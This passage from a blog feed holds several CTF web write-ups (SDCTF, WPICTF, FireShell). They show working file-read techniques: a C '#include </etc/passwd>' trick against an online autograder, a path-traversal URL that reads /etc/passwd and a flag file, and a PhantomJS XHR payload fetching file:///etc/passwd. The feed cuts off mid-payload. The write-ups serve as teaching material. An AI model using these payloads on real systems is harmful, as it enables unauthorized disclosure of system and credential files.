/api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">&#123;&quot;rocket&quot;:&quot;triton&quot;,&quot;launchTime&quot;:&quot;12:00&quot;&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 400 Bad Request</span><br><span class="line">Date: Sat, 08 May 2021 05:45:43 GMT</span><br><span class="line">Content-Length: 25</span><br><span class="line">Etag: &quot;19-mztLDY8Mq3B5NlRcCCz93/AW9/E&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec1bb20200004b0a94a2f000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=vNRmX6pCeEMNbFdJFpBoha38myORB9sQFmLzXc%2FZpdhCQdYvYemzzkWTD2bYyZs3XCHAbShDYco72bq65PpQnXmHMzmKrPA79pUBmMk%3D&quot;&#125;],&quot;max_age&quot;:604800,&quot;group&quot;:&quot;cf-nel&quot;&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c0623009ce4b0a-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">fuel pumpID not specified</span><br></pre></td></tr></table></figure><p>We now have to add pumpID value. We can get it by querying the &#x2F;fuel endpoint or bruteforce the numerical value in this request. After trying available pumpIDs we get the one that works.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">&#123;&quot;rocket&quot;:&quot;triton&quot;,&quot;launchTime&quot;:&quot;12:00&quot;,&quot;pumpID&quot;:4&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 400 Bad Request</span><br><span class="line">Date: Sat, 08 May 2021 05:47:00 GMT</span><br><span class="line">Content-Length: 42</span><br><span class="line">Etag: &quot;2a-v5ExyC0zETE7PzLwSkFsUIYG9H0&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec1cddd000004af8321a7000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;group&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=WYVsqRAJnviX%2FFIDgpJ0rK2EM9%2B%2Fjx6XFpN80Xc91zn6gWjEoL2y3sDIph3zLWiLPuMO0fy3NOs4xW0LUrflB%2BtyVL13ISK1N0cJ4Eg%3D&quot;&#125;]&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c0640fbda44af8-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">frontend authorization token not specified</span><br></pre></td></tr></table></figure><p>Its now asking for a authorization token. So I went ahead and searched for token in the burp history. All the js files had a token as below</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Token:&quot;yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ&quot;</span><br></pre></td></tr></table></figure><p>This is where I was stuck a bit and started thinking too much. I am used to dealing with auth tokens in request headers, hence I tried to add this token as a header. I tried various auth related headers and a few combinations of them but nothing worked. Than I took a step back and tried to approach it in a different way and thought of trying to add token as another json value with others and that worked resulting in below request and the flag.</p><p>Request</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 106</span><br><span class="line"></span><br><span class="line">&#123;&quot;rocket&quot;:&quot;triton&quot;,&quot;launchTime&quot;:&quot;12:00&quot;,&quot;pumpID&quot;:4,&quot;token&quot;:&quot;yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ&quot;&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Date: Sat, 08 May 2021 06:45:30 GMT</span><br><span class="line">Content-Length: 50</span><br><span class="line">Etag: &quot;32-UMBTLpu/GF1MEJ81AK5sO97tnRU&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec526b3d0000d5932c28a000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;group&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=Jf%2FOq5YiSaNHAG2nlYIxuXFPaaVftdWL0hK0QPfslFb98eji0%2BTuaT1S0%2FY2688hypXl6dZqHRMOUoWxuY4Fh%2B%2BWzAVQjxS1%2FmiTLXA%3D&quot;&#125;]&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c0b9bec975d593-BOM</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">rocket launched. sdctf&#123;0ne_sM@lL_sT3p_f0R_h@ck3r$&#125;</span><br></pre></td></tr></table></figure><p>This was how I approached the problem and solved it. Feel free to ping me on twitter for feedback or queries.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> enumeration </tag>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving autograder from WPICTF CTF 2020</title>
      <link href="/solving-autograder-from-wpictf-ctf-2020/"/>
      <url>/solving-autograder-from-wpictf-ctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The autograder from WPICTF CTF 2020 challenge had below note:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A prof made a little homework grader at https://autograder.wpictf.xyz/ </span><br><span class="line">but I heard he is hiding a flag at /home/ctf/flag.txt</span><br><span class="line">made by: awg and rm -k</span><br></pre></td></tr></table></figure><p>The challenge page allowed us to include C code which would than be sent to the server, compiled and return the results as shown below:</p><p><img src="/solving-autograder-from-wpictf-ctf-2020/10.1.jpg" alt="alt"></p><p>Immediate reaction to this was to read the &#x2F;etc&#x2F;passwd by submitting a code that would read it and see if it could work. After trying a multiple ways to achieve it nothing seemed to worked. All I could get was error such as below:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Run stdout</span><br><span class="line">None</span><br><span class="line">stderr</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>Then, while searching for ways to solve this I remembered reading about a similar CTF challenge which would read file when the file was used in #include directive. So I thought of giving it a try. I simply included another directive to the already available program such as below and that gave us the first line of the &#x2F;etc&#x2F;passwd file in the error.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;/etc/passwd&gt;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Compiler stdout</span><br><span class="line">None</span><br><span class="line">stderr</span><br><span class="line">In file included from /tmp/sarce/tmp31nm_f69/input.c:11:</span><br><span class="line">/etc/passwd:1:5: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘:’ token</span><br><span class="line">    1 | root:x:0:0::/root:/bin/bash</span><br><span class="line">      |     ^</span><br></pre></td></tr></table></figure><p>This looks like enough of file disclosure to read the flag. Now we could retrieve the flag by including it as follows. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;/home/ctf/flag.txt&gt;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Compiler stdout</span><br><span class="line">None</span><br><span class="line">stderr</span><br><span class="line">In file included from /tmp/sarce/tmpzvurrumi/input.c:11:</span><br><span class="line">/home/ctf/flag.txt:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘&#123;’ token</span><br><span class="line">    1 | WPI&#123;D0nt_run_as_r00t&#125;</span><br><span class="line">      |  </span><br></pre></td></tr></table></figure><p><img src="/solving-autograder-from-wpictf-ctf-2020/10.3.jpg" alt="alt"></p><p>Thanks WPICTF team from the challs. Thanks for stopping by. Feel free to contact me on twitter for any queries or feedback. Cheers!!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> file read </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving dorsia2 from WPICTF CTF 2020</title>
      <link href="/solving-dorsia2-from-wpictf-ctf-2020/"/>
      <url>/solving-dorsia2-from-wpictf-ctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The dorsia2 from WPICTF CTF 2020 challenge had below note:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The second card.</span><br><span class="line"></span><br><span class="line">http://dorsia2.wpictf.xyz:31337/index.html or 31338 or 31339</span><br><span class="line"></span><br><span class="line">Firefox doesn&#x27;t like the page... try chromium.</span><br><span class="line"></span><br><span class="line">made by: awg</span><br><span class="line"></span><br><span class="line">Hint: flag in ~/flag.txt</span><br></pre></td></tr></table></figure><p>Visiting the challenge URL gives us the below response. Looks like the entire source code of the web page is returned.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">HTTP 200</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BATEMAN APPRECIATION CLUB<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.w3schools.com/w3css/4/w3.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/png&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/favicon.png&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.mySlides</span> &#123;<span class="attribute">display</span>:none;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;w3-center&quot;</span>&gt;</span>Mergers and Aquisitions<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;w3-content w3-display-container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;mySlides&quot;</span> <span class="attr">src</span>=<span class="string">&quot;bm1.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;mySlides&quot;</span> <span class="attr">src</span>=<span class="string">&quot;bm2.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;mySlides&quot;</span> <span class="attr">src</span>=<span class="string">&quot;bm3.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;mySlides&quot;</span> <span class="attr">src</span>=<span class="string">&quot;bm4.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;mySlides&quot;</span> <span class="attr">src</span>=<span class="string">&quot;bm5.gif&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;w3-button w3-black w3-display-left&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;plusDivs(-1)&quot;</span>&gt;</span><span class="symbol">&amp;#10094;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;w3-button w3-black w3-display-right&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;plusDivs(1)&quot;</span>&gt;</span><span class="symbol">&amp;#10095;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> slideIndex = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">showDivs</span>(slideIndex);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">plusDivs</span>(<span class="params">n</span>)&#123;<span class="title function_">showDivs</span>(slideIndex += n);&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">showDivs</span>(<span class="params">n</span>)&#123;<span class="keyword">var</span> i;<span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;mySlides&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(n&gt;x.<span class="property">length</span>)&#123;slideIndex=<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(n&lt;<span class="number">1</span>)&#123;slideIndex=x.<span class="property">length</span>&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">x[i].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;  </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">x[slideIndex-<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;  </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Nothing much important in code that we can use. Having a look at the webm file from the challenge note, showed us a funny spoof video of a scene from American Psycho. The important part from the video is shown below asking us to check the second card. Video also mentioned a file path traversal in that code.</p><p><img src="/solving-dorsia2-from-wpictf-ctf-2020/11.1.jpg" alt="alt"></p><p>Lets understand the right hand side (second card) code a bit here in order to exploit it.</p><ul><li>a character array is defined using char a[69]</li><li>the scanf function retrieves the part after GET &#x2F; using %s identifier and assigns it to a array</li><li>Next printf will output HTTP 200 \r\n\r\n on the stdout</li><li>fflush will clear the stdout</li><li>execlp will execute cat on a. The syntax seems a bit confusing but it works somehow with a as argument repeated twice.</li><li>comment at the end stating to run this code in &#x2F;home&#x2F;ctf&#x2F;web&#x2F;</li></ul><p>Having understood this much from the code, now we know that the source code displayed when viewing the challenge URL was due the fact that index.html was supplied as input to cat in that C program. When I supplied the payload of &#x2F;etc&#x2F;passwd in the GET request as below, it worked as expected. Note the the &#x2F;&#x2F; after 31337.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dorsia2.wpictf.xyz:31337//etc/passwd</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP 200</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:101:102::/home/syslog:/usr/sbin/nologin</span><br><span class="line">ctf:x:1000:1000::/home/ctf:/bin/bash</span><br></pre></td></tr></table></figure><p>So now we gather the flag using the comment from the last line of the code and the hint from the challenge note. ~&#x2F; signifies the home directory from the challenge note and we see a user ctf mentioned in the code comments as well as output of &#x2F;etc&#x2F;passwd. So we make the final request to get the flag.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dorsia2.wpictf.xyz:31337//home/ctf/flag.txt</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP 200</span><br><span class="line"></span><br><span class="line">WPI&#123;1_H4VE_2_return_SOME_VIDE0TAP3S&#125;</span><br></pre></td></tr></table></figure><p>Thanks for reading and thanks WPICTF team from the challs. Feel free to contact me on twitter for any queries or feedback. Cheers!!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> file read </tag>
            
            <tag> lfi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Screenshoter from FireShell CTF 2020</title>
      <link href="/solving-screenshoter-from-fireshell-ctf-2020/"/>
      <url>/solving-screenshoter-from-fireshell-ctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The Screenshoter from FireShell CTF 2020 challenge had below note:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Turn your beautiful website into an image with our new tool!</span><br><span class="line"></span><br><span class="line">flag is on /flag</span><br><span class="line"></span><br><span class="line">https://screenshoter.fireshellsecurity.team/</span><br></pre></td></tr></table></figure><p>The challenge page has an option to provide URL which will be accessed and a screenshot of the page retrieved would be provided, as a service. This is quite similar to their URL to PDF challenge. Using requestbin we can see that the provide URL is accessed with user agent Mozilla&#x2F;5.0 (Unknown; Linux x86_64) AppleWebKit&#x2F;538.1 (KHTML, like Gecko) PhantomJS&#x2F;2.1.1 Safari&#x2F;538.1</p><p><img src="/solving-screenshoter-from-fireshell-ctf-2020/9.1.jpg" alt="alt"><br><img src="/solving-screenshoter-from-fireshell-ctf-2020/9.2.jpg" alt="alt"></p><p>Searching around for vulnerabilities around PhantomJS&#x2F;2.1.1 lands us to this research. As explained in the PDF its possible to retrieve files from remote host using XHR requests. So I copied the payload from the research and hosted it on filebin. Payload was as follows</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span 